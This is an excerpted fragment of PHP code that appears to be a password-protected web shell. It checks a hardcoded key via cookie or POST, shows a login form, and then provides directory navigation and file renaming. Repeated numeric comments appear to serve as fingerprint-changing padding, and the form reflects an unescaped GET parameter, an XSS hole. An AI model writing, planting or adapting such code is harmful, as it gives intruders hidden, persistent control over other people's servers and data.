...
$auth_key = "8684e174a037869c94403dbd3bba50b6";
...
$pass = false;
if (isset($_COOKIE['pw_name_89622'])) {
    if(($_COOKIE['pw_name_89622']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_89622'])) {
        if(($_POST['pw_name_89622']) == $auth_key) {
            setcookie("pw_name_89622", $_POST['pw_name_89622']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_89622' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721698953702804 1721698953312872 1721698953891960 1721698953587322
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721698953702804 1721698953312872 1721698953891960 1721698953587322
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721698953702804 1721698953312872 1721698953891960 1721698953587322
            $name = PATH . "/" . $_GET['r'];
